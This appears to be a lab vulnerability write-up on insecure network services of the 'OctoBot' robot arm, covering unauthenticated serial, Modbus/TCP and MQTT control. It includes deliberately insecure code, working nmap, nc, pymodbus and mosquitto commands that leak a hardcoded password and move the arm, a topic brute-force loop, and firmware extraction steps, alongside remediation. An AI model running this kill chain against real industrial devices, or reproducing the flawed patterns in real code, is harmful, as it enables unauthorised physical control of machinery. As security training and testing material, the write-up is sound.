---
id: IoT:I2
title: "Insecure Network Services"
category: IoT
status: IN PROGRESS
severity: Critical
owasp: "IoT I2 - Insecure Network Services"
cwe: "CWE-306 (Missing Authentication for Critical Function) / CWE-319 (Cleartext Transmission)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §5, §7 (IoT:I2)"
  - "stages/01_spec/output/octobot-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/serial_bus.py"
  - "labs/octobot/files/opt/octobot/robot_modbus_server.py"
  - "labs/octobot/files/opt/octobot/robot_mqtt_bridge.py"
verified_date: ""
---

## Why It Matters

The robot arm is reachable over three network services on the flat lab LAN: a raw serial-over-TCP bus (`:2000`), Modbus/TCP (`:502`), and MQTT (`:1883`). All three are reachable without credentials, but the difficulty of moving the arm varies. The raw bus now requires the hardcoded `PASS:` prefix, Modbus/TCP requires the password XOR-encrypted into holding registers, and MQTT auto-injects the password for any publisher. The net result is still unauthenticated physical control for anyone who discovers the easiest path (MQTT) or extracts the password leaked by the Modbus failure path, which is the canonical ICS exposure: network reachability becomes actuator control. Reconnaissance is trivial: nmap's `mqtt-subscribe` script succeeds anonymously and leaks the broker version plus full `$SYS` telemetry, while `8883/tcp` is closed, confirming no TLS path exists.

## Root Cause

The serial bus binds all interfaces and accepts any TCP connection, and MQTT still moves the arm with no credentials:

```python
# labs/octobot/files/opt/octobot/serial_bus.py
srv.bind(('0.0.0.0', BUS_PORT))                # [IoT:I9] binds all interfaces
...
for line in conn.makefile('r'):                # [IoT:I2] reachable without auth; movement needs PASS:
    forward(line, client)
```

```python
# labs/octobot/files/opt/octobot/robot_mqtt_bridge.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'

def bus_send(cmd):
    cmd = cmd.strip()
    if is_movement(cmd):
        cmd = f'PASS:{HARD_CODED_PASSWORD} {cmd}'
    ...forward...
```

Modbus/TCP has no session authentication by protocol design, and the server attempts to compensate with a hardcoded XOR-encrypted password. Because the encryption key is fixed and the failure handler leaks the password into readable registers, the protection is cosmetic:

```python
# labs/octobot/files/opt/octobot/robot_modbus_server.py
HARD_CODED_PASSWORD = 'OctoSuperBot2026'
AUTH_KEY = 0x55

def check_auth():
    chars = [regs[PWD_OFFSET + i] & 0xFF for i in range(PWD_LEN)]
    if decrypt_password(chars) == HARD_CODED_PASSWORD:
        regs[PWD_STATUS] = 1
        return True
    regs[PWD_STATUS] = 2
    for i, c in enumerate(HARD_CODED_PASSWORD):
        regs[PWD_HINT + i] = ord(c)
    return False
```

Firmware analysis confirms that the insecurity is baked into the base image: `binwalk` extraction of `/dev/mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`, and `/etc/mosquitto/mosquitto.conf` ships with all authentication options commented out and `use_uci 0`, so anonymous connections are allowed by default. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).

## Steps to Reproduce

### 1. Service discovery

Run a version scan against the three OctoBot OT ports on the Pi gateway (`192.168.2.1`).

```bash
nmap -sV -p 2000,502,1883 192.168.2.1
```

Expected output: the scan reports the serial bus on `:2000`, Modbus/TCP on `:502`, and mosquitto on `:1883`.

![[iot2_nmap_services.png|828]]
### 2. MQTT reconnaissance

Zoom in on the MQTT broker. The default Mosquitto 2.x install on OpenWRT binds to loopback only, but the lab hook forces it to `0.0.0.0:1883` with `allow_anonymous true`.

```bash
nmap -sC -sV -p 1883,8883 192.168.2.1
```

Expected output:

```
1883/tcp open  mosquitto version 2.0.18
| mqtt-subscribe: anonymous $SYS topic readback succeeds, leaking:
|   $SYS/broker/version: mosquitto version 2.0.18
|   $SYS/broker/clients/connected: 2
|   $SYS/broker/subscriptions/count: 1
|_  ... full broker telemetry readable without credentials
8883/tcp closed secure-mqtt
```

The `$SYS` telemetry is readable without a username or password, and `8883/tcp` is closed, confirming there is no TLS listener.

### 3. Raw serial bus without password

Connect to the raw serial-over-TCP bus and send a movement command without the actuator password. The command `S3:5` tells servo 3 (claw) to move to angle 5.

```bash
printf 'S3:5\n' | nc 192.168.2.1 2000
```

Expected output:

```
ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>
```

The arm does not move. The error leaks the hardcoded actuator password in the failure message.

### 4. Raw serial bus with password

Send the same movement command, this time prefixed with `PASS:OctoSuperBot2026 `.

```bash
printf 'PASS:OctoSuperBot2026 S3:5\n' | nc 192.168.2.1 2000
```

Expected output: the claw closes. The serial bus strips the password prefix and forwards the command to the Arduino.

### 5. Modbus/TCP password leak

Write a base servo angle to Modbus holding register 40001 (protocol offset 0) without first writing the encrypted password to registers 40021-40036. The server rejects the movement and leaks the cleartext password into registers 40038-40053.

```bash
python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",port=502); c.connect(); c.write_register(0,10); rr=c.read_holding_registers(37,count=16); print("leaked:", "".join(chr(r) for r in rr.registers)); c.close()'
```

Expected output:

```
leaked: OctoSuperBot2026
```

If a previous authenticated write left the password in registers 40021-40036, clear them first with `c.write_registers(20, [0]*16)` to force the failure path.

### 6. Modbus/TCP authenticated movement

Write the XOR-encrypted password to registers 40021-40036, then write the base angle to register 40001. The XOR key is the hardcoded `0x55`.

```bash
python3 -c '
from pymodbus.client import ModbusTcpClient as C
pwd = "OctoSuperBot2026"
enc = [ord(c) ^ 0x55 for c in pwd]
c = C("192.168.2.1", port=502)
c.connect()
c.write_registers(20, enc)   # 40021-40036
r = c.write_register(0, 10)  # 40001
print("error" if r.isError() else "ok")
c.close()
'
```

Expected output:

```
ok
```

The base servo moves. The password registers are cleared after the command, so each movement requires re-supplying the encrypted password.

### 7. MQTT kill chain

This path is the easiest because the broker is anonymous and the MQTT bridge auto-injects the actuator password.

#### 7.1 Recon

Confirm the broker and the lack of TLS (already done in Step 2):

```bash
nmap -sC -sV -p 1883,8883 192.168.2.1
```

![[iot2_nmap_mosquitto.png|552]]
#### 7.2 Enumeration — discover the topic and payload format

The broker does not advertise topic names. You need to obtain `cell01/cmd` and the `S<n>:<angle>` payload through one of the following methods.

##### 7.2.1 Passive wildcard sniffing

Subscribe to every topic with the `#` wildcard. Because authentication is disabled, anonymous clients can sniff all traffic. Use the `-v` flag so `mosquitto_sub` prints both the topic and the payload.

```bash
mosquitto_sub -h 192.168.2.1 -t '#' -v
```

If another MQTT client publishes a command while the listener is active, the output reveals both the topic and the payload format:

```
cell01/cmd/telemetry S0:90
```

The first word is the topic (`cell01/cmd/telemetry`), the second is the payload (`S0:90`). The topic hierarchy is the key: because telemetry lives under `cell01/cmd/telemetry`, the control topic one level up must be `cell01/cmd`. The payload format is the same serial command used by the raw bus and Modbus: `S<n>:<angle>` where `n` is the servo index (0=base, 1=left, 2=right, 3=claw) and `angle` is the target position.

In this lab the HMI gateway and the serial bus publish every accepted command to `cell01/cmd/telemetry`. The cloud API reaches the serial bus through Modbus, so its commands also appear on `cell01/cmd/telemetry`. The MQTT bridge only subscribes to `cell01/cmd`. A wildcard listener therefore shows live telemetry whenever the operator moves the arm through any network path, revealing both the control topic and the payload format.

##### 7.2.2 Trigger traffic via the HMI and sniff the telemetry leak

The local HMI gateway echoes every command it sends to the serial bus over an unauthenticated MQTT telemetry topic (`cell01/cmd/telemetry`). This is an insecure debug/audit feature: it exposes the cell naming convention and payload format to any anonymous subscriber.

Open two terminals.

Terminal 1 (listener):

```bash
mosquitto_sub -h 192.168.2.1 -t '#' -v
```

Terminal 2 (use the HMI to move the arm):

```bash
curl -s 'http://192.168.2.1:8090/api/move?servo=1&angle=90'
```

Or produce some movement with the API controlling options:

![[iot2_controlling_arm.png]]

Terminal 1 shows:

![[io2_mqtt_shows_controll_commands.png]]

From this leak you learn:
- the cell prefix is `cell01/`
- the payload format is `S<n>:<angle>`
- the control topic is probably `cell01/cmd`

Because the serial bus also echoes accepted commands to `cell01/cmd/telemetry`, triggering any movement path (HMI, Modbus/cloud API, or raw serial bus) produces MQTT telemetry. The HMI is the easiest to trigger with `curl`, but all network paths now leak through MQTT.

##### 7.2.3 Source-code disclosure

If you have filesystem access to the Pi or the extracted overlay, the topic is hardcoded:

```bash
grep -n "TOPIC" /opt/octobot/robot_mqtt_bridge.py
# -> TOPIC = 'cell01/cmd'
```

Reading the same file also shows the movement prefixes the bridge recognizes:

```python
MOVEMENT_PREFIXES = ('S0:', 'S1:', 'S2:', 'S3:', 'RECORD', 'PLAY', 'STOP', 'DEMO', 'SPD:')
```

##### 7.2.4 Mobile app / cloud API analysis

The Android app and the cloud API are Modbus masters, not MQTT publishers, but the app ships with strings and API docs that describe the servo naming scheme. Decompiling the app or calling the cloud API endpoints (`/api/state`, `/api/servo/<n>`) reveals the same `S0`/`S1`/`S2`/`S3` servo model, which makes the MQTT payload format predictable.

##### 7.2.5 Topic brute-forcing / guessing (fallback only)

With the `cell01/cmd/telemetry` leak, brute-forcing should not be necessary: the hierarchy tells you the control topic is `cell01/cmd`. If the telemetry feature were absent or disabled, a real attacker would not guess four or five magic strings. They would need a wordlist built from the target context (facility names, cell IDs, device model numbers, protocol conventions) and an automated MQTT topic enumerator.

Mosquitto does not rate-limit anonymous clients, so rapid subscription and publish attempts are cheap. A realistic fallback script reads a wordlist and publishes a harmless probe payload to each candidate topic, watching the arm for movement:

```bash
# wordlist.txt contains candidate roots like cell01, robot, arm, line1, etc.
# plus common suffixes like /cmd, /command, /set, /control
cat wordlist.txt | while read root; do
  for suffix in cmd command set control move; do
    topic="${root}/${suffix}"
    mosquitto_pub -h 192.168.2.1 -t "$topic" -m 'S0:90'
    sleep 0.5
  done
done
```

The catch is that the wordlist must come from somewhere: decompiled mobile-app strings, product documentation, network hostnames, or information gathered earlier in the engagement. Without that context, blind brute-forcing against a topic namespace is slow and noisy. In this lab, reading the telemetry hierarchy or the bridge source is far more reliable than guessing.

#### 7.3 Exploitation

Publish a movement command to the discovered topic. No username or password is required.

```bash
mosquitto_pub -h 192.168.2.1 -t cell01/cmd -m 'S0:0'
```

Expected output: the base servo moves to angle 0.

#### 7.4 Impact

`robot_mqtt_bridge.py` subscribes to `cell01/cmd` and forwards every payload to the serial bus. Before forwarding, it prepends `PASS:OctoSuperBot2026 ` to any movement command:

```python
cmd = f'PASS:{HARD_CODED_PASSWORD} {cmd}'
```

Anonymous MQTT publish access therefore becomes full actuator control.

### 8. Firmware forensics

Confirm that the broker ships without TLS and with anonymous access enabled by default in the base Squashfs image.

```bash
ssh root@192.168.2.1 'dd if=/dev/mmcblk0p2 bs=4M count=32 2>/dev/null' > p2_sample.img
binwalk -e -M p2_sample.img
grep -E "^Package: mosquitto-nossl" _p2_sample.img.extracted/squashfs-root/usr/lib/opkg/status
```

Expected output:

```
Package: mosquitto-nossl
```

```bash
grep -E "allow_anonymous|use_uci" _p2_sample.img.extracted/squashfs-root/etc/mosquitto/mosquitto.conf
```

Expected output:

```
# allow_anonymous true  (commented, default is anonymous allowed)
#use_uci 0
```

## Expected Result

`nmap` fingerprints all three open ports. The raw serial bus drops movement commands without `PASS:`, returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`, and executes commands with it. Modbus/TCP rejects command writes that lack the encrypted password and leaks the cleartext password into registers 40038-40053. MQTT allows anonymous subscription to `#`; the HMI gateway and the serial bus echo accepted commands to `cell01/cmd/telemetry`, so any network movement reveals the topic naming and payload format. Publishing to `cell01/cmd` moves the arm because the bridge auto-injects the password.

## How It Should Be

Put the OT services behind authentication and transport security: client certificates or a token on the bus and MQTT, Modbus wrapped in TLS (stunnel) or replaced with an authenticated channel, and bind to the management interface only rather than `0.0.0.0`. Never use a fixed XOR key or leak the password in diagnostic registers.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Network | Bind to LAN-mgmt interface, firewall to a jump host | Remove blanket reachability |
| Transport | TLS on the bus, MQTT over TLS, Modbus via stunnel | End cleartext control |
| Auth | Token / client cert on every northbound service | No anonymous actuation |
| Crypto | Use a real key-agreement or HMAC, not a fixed XOR | Prevent trivial decryption and password leaks |

## Verification Checklist

- [ ] `nmap -sV` shows `:2000`, `:502`, `:1883` open
- [ ] `nmap -sC -sV -p 1883,8883` fingerprints `mosquitto version 2.0.18` and reads `$SYS/broker/*` telemetry without credentials
- [ ] `nmap -sC -sV -p 1883,8883` shows `8883/tcp closed secure-mqtt`
- [ ] `printf 'S0:90\n' | nc :2000` does **not** move the arm and returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`
- [ ] `printf 'PASS:OctoSuperBot2026 S0:90\n' | nc :2000` moves the arm
- [ ] Modbus register write without prior encrypted password returns an exception and leaks `OctoSuperBot2026` into registers 40038-40053
- [ ] Modbus register write with encrypted password in 40021-40036 moves the arm
- [ ] `mosquitto_sub -h 192.168.2.1 -t '#' -v` succeeds anonymously and shows `cell01/cmd/telemetry S<n>:<angle>` when the arm moves
- [ ] `mosquitto_pub` to `cell01/cmd` moves the arm with no credentials
- [ ] Binwalk extraction of `mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`
- [ ] Extracted `/etc/mosquitto/mosquitto.conf` leaves `allow_anonymous` implicitly true
